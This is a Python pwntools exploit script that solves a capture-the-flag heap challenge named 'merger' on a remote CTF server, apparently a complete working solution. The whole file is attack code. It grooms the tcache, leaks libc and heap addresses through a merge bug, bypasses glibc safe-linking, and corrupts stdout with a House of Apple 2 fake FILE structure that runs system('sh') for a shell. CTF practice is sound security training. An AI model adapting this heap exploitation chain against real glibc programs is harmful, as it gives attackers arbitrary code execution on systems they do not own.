#!/usr/bin/env python3
from pwn import *
from pwncli import IO_FILE_plus_struct

# =========================================================
#                          SETUP
# =========================================================
exe = './merger_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'einstein-bd91179989a5c1ab.deploy.phreaks.fr', 443

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    set sysroot /proc/{pid}/root
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/merger"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe=elf.path)
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================

def onegadget():
    try:
        result = process(["one_gadget", "-r", "-l", "30", "libc.so.6"])
        output = result.recvline().decode().strip().split(" ")
        result.close()
        one_gadget = [int(addr) for addr in output]
        return one_gadget
    except Exception as e:
        print(f"Error running one_gadget: {e}")
        return []

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def malloc(idx, size=0, data=b""):
    io.sendlineafter("> ", b"1")
    io.sendlineafter("index: ", str(idx).encode())
    io.sendlineafter("size: ", str(size-1).encode())
    io.sendlineafter("data: ", data)

def free(idx):
    io.sendlineafter("> ", b"2")
    io.sendlineafter("index: ", str(idx).encode())

def view(idx):
    io.sendlineafter("> ", b"3")
    io.sendlineafter("index: ", str(idx).encode())

def merge(dst, src):
    io.sendlineafter("> ", b"4")
    io.sendlineafter("dst: ", str(dst).encode())
    io.sendlineafter("src: ", str(src).encode())


def exploit():
    global io 
    io = initialize()
    with log.progress("Preparing tcache"), context.silent:
        for i in range(7):
            malloc(i, 0x88)
        for i in range(7):
            malloc(i+7, 0x78)
        malloc(31, 0xff, b"A"*0xf8) #Stdout victim
        malloc(14, 0x88, b"C"*0x80 + b"|") #Libc victim
        malloc(15, 0x78)
        malloc(16, 0x18)
    with log.progress("Filling tcache"), context.silent:
        for i in range(7):
            free(i)
            free(i+7)
    with log.progress("Deplated top chunk"), context.silent:
        top_chunk = 0x203c1
        for i in range((top_chunk//0x100)):
                malloc(30, 0xf8)
    with log.progress("Leaking libc"), context.silent:
        free(15)
        merge(14, 14)
        io.recvuntil("|")
        libc_leak = (u64(io.recvline().strip().ljust(8, b"\x00")) << 8)
        libc.address = libc_leak - 0x203b00
    log.info(f"Libc leak: %#x", libc_leak)
    log.info(f"Libc base: %#x", libc.address)
    with log.progress("Fix unsorted bin & Leaking Heap"), context.silent:
        malloc(17, 0xff, p64(libc_leak+ 0x20)*2)
        malloc(18, 0xff, b"A")
        free(18)
        view(17)
        heap = u64(io.recvline().strip().ljust(8, b"\x00")) << 12
    log.info(f"Heap base: %#x", heap)
    with log.progress("Preparing overwrite stdout"), context.silent:
        for i in range(8):
            malloc(i+18, 0xff)
        for i in range(7):
            free(i+19)
        free(17)
        free(31)
        for i in range(6):
            malloc(i+19, 0xff, b"A")
        free(18)
        malloc(19, 0xf8)
    with log.progress("House of apple IO operation"), context.silent:
        malloc(20, 0xf8, p64(0)*2 + p64(mangle(heap, libc.sym["_IO_2_1_stdout_"])))
        malloc(21, 0xff)
        malloc(22, 0xff, IO_FILE_plus_struct().house_of_apple2_execmd_when_do_IO_operation(libc.sym["_IO_2_1_stdout_"], libc.sym["_IO_wfile_jumps"], libc.sym["system"], "sh")[:0x100-1])
    io.interactive()

if __name__ == '__main__':
    exploit()
